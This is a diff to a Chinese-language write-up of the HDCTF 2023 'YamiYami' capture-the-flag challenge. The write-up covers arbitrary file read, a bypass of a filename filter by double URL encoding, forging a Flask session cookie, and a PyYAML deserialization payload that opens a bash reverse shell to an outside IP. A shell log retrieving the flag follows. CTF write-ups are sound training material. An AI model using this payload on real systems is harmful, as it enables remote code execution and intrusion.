@@ -1,4 +1,4 @@
-#  [HDCTF 2023]YamiYami
+#  [HDCTF 2023]YamiYami 复现
 
 ## 0、知识点
 
@@ -22,12 +22,12 @@
     -   `href="/pwd"`
         -   打开 会显示一个路径`/app`
 
--   然后尝试读源码
+-   由于可能存在任意文件读取，那么就可以尝试读取源码
 
--   使用file:///app.py
+-   使用`file:///app.py`
 
     -   发现存在过滤返回：`re.findall('app.*', url, re.IGNORECASE)`
-    -   绕过方式双重URL编码绕过
+    -   **绕过方式双重URL编码绕过**
 
 -   绕过后并未发现源码，想起pwd显示的路径
 
@@ -178,7 +178,7 @@ python3.9 flask_session_cookie_manager3.py encode -t "{'passport': 'Welcome To H
 # 结果为：eyJwYXNzcG9ydCI6IldlbGNvbWUgVG8gSERDVEYyMDIzIn0.ZEiSkQ.UJ6u_SeyNSd2dTKGE0yuBEROShs
 ```
 
->   然后将得到session值放入请求头
+>   然后将得到值替换掉当前的session值
 
 >   然后就是pyyaml的反序列，看了下出题人的payload，使用了反弹shell
 
@@ -186,7 +186,7 @@ python3.9 flask_session_cookie_manager3.py encode -t "{'passport': 'Welcome To H
 !!python/object/new:str
     args: []
     state: !!python/tuple
-      - "__import__('os').system('bash -c \"bash -i >& /dev/tcp/114.116.119.253/7777 <&1\"')"
+      - "__import__('os').system('bash -c \"bash -i >& /dev/tcp/113.124.234.43/1999 <&1\"')"
       - !!python/object/new:staticmethod
         args: []
         state:
@@ -194,7 +194,34 @@ python3.9 flask_session_cookie_manager3.py encode -t "{'passport': 'Welcome To H
           items: !!python/name:list
 ```
 
->   上传成功后去访问这个文件就会触发
+>   上传成功后去访问这个文件：`http://node2.anna.nssctf.cn:28809/boogipop?file=uploads/a.txt`
+>
+>   注意：访问之前先在自己的服务器上开好监听
+
+```nginx
+ctf@1571cd151b304d31:/app$ ls
+app.py
+requirements.txt
+start.sh
+static
+templates
+uploads
+ctf@1571cd151b304d31:/app$ cd /
+ctf@1571cd151b304d31:/$ ls
+ls
+flag.sh
+ctf@1571cd151b304d31:/$ cat flag.sh
+echo $FLAG > /tmp/flag_13_114514
+ctf@1571cd151b304d31:/$ cd /tmp
+ctf@1571cd151b304d31:/tmp$ ls
+flag_13_114514
+ctf@1571cd151b304d31:/tmp$ cat fla*
+cat fla*
+NSSCTF{a04b7ddb-f2a3-4d80-ba21-d3c2603d84ee}
+ctf@1571cd151b304d31:/tmp$ 
+```
+
+
 
 >   **另外这题还有一个非预期解**
 
